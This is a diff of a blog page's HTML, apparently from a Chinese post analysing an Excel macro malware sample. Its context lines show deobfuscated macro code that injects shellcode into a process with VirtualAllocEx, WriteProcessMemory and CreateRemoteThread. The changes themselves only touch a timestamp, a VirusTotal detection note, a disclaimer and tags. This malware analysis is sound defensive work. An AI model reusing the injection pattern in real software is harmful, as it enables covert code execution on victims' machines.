@@ -18,7 +18,7 @@
 <meta property="og:image" content="http://xnianq.cn/2018/11/01/对excel宏病毒的分析/excel-1.png">
 <meta property="og:image" content="http://xnianq.cn/2018/11/01/对excel宏病毒的分析/excel-2.png">
 <meta property="og:image" content="http://xnianq.cn/2018/11/01/对excel宏病毒的分析/vt.png">
-<meta property="og:updated_time" content="2018-11-01T06:52:36.595Z">
+<meta property="og:updated_time" content="2018-11-01T06:56:42.901Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="对excel宏病毒的分析">
 <meta name="twitter:description" content="对excel宏病毒的分析同事给了一个excel宏样本,以前也没分析过，正好试着分析一下，技术含量较小，所以当作科普贴吧.">
@@ -188,8 +188,8 @@
 <p>然后就是为要注入的shellcode开辟空间:<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">a48</span> = <span class="symbol">f2</span>(pInfo.<span class="symbol">a1</span>, <span class="number">0</span>, UBound(<span class="symbol">t1</span>), &amp;<span class="symbol">H1000</span>, &amp;<span class="symbol">H40</span>) </div><div class="line">=&gt;</div><div class="line">VirtualAllocEx(pInfo.<span class="symbol">a1</span>, <span class="number">0</span>, UBound(<span class="symbol">t1</span>), &amp;<span class="symbol">H1000</span>, &amp;<span class="symbol">H40</span>) // UBound(<span class="symbol">t1</span>)为shellcode长度</div></pre></td></tr></table></figure></p>
 <p>开辟之后,将shellcode一个字节一个字节的写入开辟的空间内:<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">For <span class="symbol">a45</span> = LBound(<span class="symbol">t1</span>) To UBound(<span class="symbol">t1</span>)</div><div class="line">    <span class="symbol">a44</span> = <span class="symbol">t1</span>(<span class="symbol">a45</span>)</div><div class="line">    <span class="symbol">a49</span> = <span class="symbol">f3</span>(pInfo.<span class="symbol">a1</span>, <span class="symbol">a48</span> + <span class="symbol">a45</span>, <span class="symbol">a44</span>, <span class="number">1</span>, ByVal <span class="number">0</span>&amp;)</div><div class="line">Next <span class="symbol">a45</span></div><div class="line"><span class="symbol"></span></div><div class="line"><span class="symbol"></span>=&gt;</div><div class="line">For <span class="symbol">a45</span> = LBound(<span class="symbol">t1</span>) To UBound(<span class="symbol">t1</span>)</div><div class="line">    <span class="symbol">a44</span> = <span class="symbol">t1</span>(<span class="symbol">a45</span>)</div><div class="line">    <span class="symbol">a49</span> = WriteProcessMemory(pInfo.<span class="symbol">a1</span>, <span class="symbol">a48</span> + <span class="symbol">a45</span>, <span class="symbol">a44</span>, <span class="number">1</span>, ByVal <span class="number">0</span>&amp;) //<span class="symbol">a48</span>为之前开辟的空间</div><div class="line">Next <span class="symbol">a45</span></div></pre></td></tr></table></figure></p>
 <p>最后使用CreateRemoteThread进行注入:<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">a49</span> = <span class="symbol">f1</span>(pInfo.<span class="symbol">a1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="symbol">a48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">=&gt;</div><div class="line">CreateRemoteThread(pInfo.<span class="symbol">a1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="symbol">a48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div></pre></td></tr></table></figure></p>
-<p>到这里已经将shellcode完整的启动起来了,就上线了~</p>
-<p>在VT上查了一下样本的免杀率，28/58，国内的基本都可以杀，不懂为啥还有那么高的中招率..<br><img src="http://xnianq.cn/2018/11/01/对excel宏病毒的分析/vt.png" alt=""></p>
+<p>到这里已经将shellcode完整的启动起来了,就上线了~<br>在VT上查了一下样本的免杀率，28/58，国内的基本都可以杀，不懂为啥还有那么高的中招率..<br><img src="http://xnianq.cn/2018/11/01/对excel宏病毒的分析/vt.png" alt=""></p>
+<p><strong>文章仅仅作为分析，请勿用于非法用途，一切后果均与作者无关</strong></p>
 <hr>
 <p>本文出自”xnianq Blog”：www.xnianq.cn/2018/11/01/对excel宏病毒的分析/</p>
 
@@ -453,15 +453,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">crypto</a>
               </li>
              
               <li class="article-tag-list-item">
